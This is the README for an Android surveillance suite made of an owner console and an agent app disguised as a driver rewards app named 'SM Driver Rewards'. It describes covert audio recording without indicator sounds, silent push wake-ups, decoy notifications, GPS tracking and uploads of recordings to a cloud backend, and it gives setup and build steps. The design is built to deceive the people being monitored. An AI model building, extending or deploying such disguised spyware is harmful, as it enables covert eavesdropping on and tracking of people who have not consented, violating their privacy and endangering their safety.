# SM Telemetry & Surveillance Suite

A two-app Android telemetry and remote operations suite designed for fleet oversight. The suite consists of an **Owner Command Console** (`com.sm.ownerconsole`) and a disguised **Agent Application** (`com.sm.driverrewards`) posing as an innocent driver partner rewards and mileage incentives app ("SM Driver Rewards").

---

## 1. Architecture Overview

```
                      +-----------------------------+
                      |   Owner Console (Android)   |
                      |   com.sm.ownerconsole       |
                      +--------------+--------------+
                                     |
                                     | HTTPS / WSS
                                     v
                      +-----------------------------+
                      |     Supabase Backend        |
                      | (Auth + Postgres + Storage) |
                      +--------------+--------------+
                                     |
                                     | High-Priority Data Push (FCM)
                                     v
                      +-----------------------------+
                      |      Firebase Cloud         |
                      |        Messaging            |
                      +--------------+--------------+
                                     | Silent Wake-up
                                     v
                      +-----------------------------+
                      |  Disguised Agent App        |
                      |  "SM Driver Rewards"        |
                      |  com.sm.driverrewards       |
                      +-----------------------------+
```

### Key Pillars
1. **Disguised Agent Surface**: Poses as a legitimate delivery partner utility ("SM Driver Rewards") featuring daily streak bonuses, fuel cashbacks, shift histories, and tier badges.
2. **Silent Wake-up (Zero Beep)**: Wakes strictly on FCM high-priority data messages or 15-minute WorkManager heartbeat. Employs raw `AudioRecord` + `MediaCodec` (AAC 32kbps mono) rather than `MediaRecorder`, eliminating system camera/shutter beeps.
3. **No Persistent Foreground Service**: Executes transient foreground services (with `IMPORTANCE_LOW` silent notifications: *"Driver Rewards Sync - Checking route updates..."*), performs the task in 60-second chunks, uploads directly to Supabase Storage, and immediately terminates.
4. **Resilient Fail-Safe Heartbeat**: 15-minute periodic `WorkManager` heartbeat to report battery/online metrics and process any commands missed due to Doze mode.

---

## 2. Audio Pipeline Teardown

```
Hardware Mic -> AudioRecord (PCM 16-bit, 16kHz Mono)
                     |
                     v
             MediaCodec (AAC-LC, 32 kbps)
                     |
                     v
             MediaMuxer (.m4a container, 60s chunks)
                     |
                     +---> Upload to Supabase Storage ('recordings/{device_id}/')
                     |
                     +---> Insert metadata to 'recordings' table
                     |
                     +---> Delete local chunk file immediately
                     |
                     +---> Enforce 200MB local cache ceiling
```

- **Sample Rate**: 16,000 Hz (16 kHz).
- **Channels**: 1 (Mono).
- **Bitrate**: 32,000 bps (32 kbps).
- **Chunk Duration**: 60 seconds.
- **Cache Cap**: If device is offline, chunks buffer up to 200 MB maximum before rolling off the oldest un-uploaded chunks.

---

## 3. Database & Storage Architecture

### Tables (`backend/schema.sql`)
- `owners`: Maps to `auth.users(id)` for console operator accounts.
- `devices`: Tracks registered agent devices, models, battery levels, charging status, FCM tokens, and last seen timestamps.
- `commands`: Command queue (`get_location`, `start_recording`, `stop_recording`, `live_track`) with state tracking (`pending`, `executing`, `completed`, `failed`).
- `locations`: GPS telemetry coordinates, accuracy, speed, altitude, and battery metrics.
- `recordings`: Metadata records for audio chunks stored in cloud storage.

### Storage
- Bucket: `recordings` (Private).
- Access Control (`backend/policies.sql`): Authenticated owners can stream/download/delete via signed URLs (`createSignedUrl`). Agents upload directly via storage policies.

---

## 4. Configuration & Deployment

### 1. Supabase Setup
1. Create a free project on [Supabase](https://supabase.com).
2. Go to the SQL Editor in Supabase and run:
   - `backend/schema.sql`
   - `backend/policies.sql`
3. Retrieve your **Project URL** and **Anon Public Key** from `Project Settings -> API`.
4. Update `core/src/main/java/com/sm/core/config/AppConfig.kt`:
   ```kotlin
   AppConfig.SUPABASE_URL = "https://your-project.supabase.co"
   AppConfig.SUPABASE_ANON_KEY = "your-anon-key"
   ```

### 2. Firebase Cloud Messaging (FCM)
1. In the [Firebase Console](https://console.firebase.google.com), create a project.
2. Add an Android app with package:
   - `com.sm.driverrewards`
3. Download `google-services.json` and place it in `agent-app/google-services.json`.

### 3. Build & Signing
Build release APKs using Gradle:
```bash
./gradlew assembleRelease
```
Outputs:
- Agent App: `agent-app/build/outputs/apk/release/agent-app-release.apk`
- Owner App: `owner-app/build/outputs/apk/release/owner-app-release.apk`

---

## 5. Repository Structure

```
projectritmada/
├── .github/workflows/
│   └── build-apk.yml               # CI workflow for signed APK builds on tag
├── backend/
│   ├── schema.sql                  # Supabase database schema & bucket definitions
│   └── policies.sql                # Row-Level Security (RLS) & RPC stored procedures
├── core/                           # Shared module: Models, Config & Supabase Client
├── agent-app/                      # Disguised Agent App (SM Driver Rewards)
│   ├── src/main/java/com/sm/driverrewards/
│   │   ├── DriverRewardsApp.kt     # App entry & silent notification channel
│   │   ├── service/audio/          # AudioRecord + MediaCodec pipeline (AAC 32kbps)
│   │   ├── service/location/       # FusedLocationProviderClient telemetry
│   │   ├── service/                # FcmPushService & TelemetryExecutionService
│   │   ├── worker/                 # HeartbeatWorker (15m WorkManager)
│   │   └── ui/                     # SetupScreen & RewardsDashboardScreen
├── owner-app/                      # Command Console App (SM Owner Console)
│   ├── src/main/java/com/sm/ownerconsole/
│   │   ├── data/repository/        # OwnerRepository (Auth, RPCs, Signed URLs)
│   │   ├── ui/auth/                # High-tech login terminal
│   │   ├── ui/devices/             # Fleet radar & pairing code generator
│   │   ├── ui/detail/              # Commands, location map intent, audio player
│   │   └── ui/player/              # Media3 ExoPlayer stream controller
├── README.md
├── SETUP.md                        # Per-OEM background permission guide
└── TROUBLESHOOTING.md              # Debugging & optimization reference
```
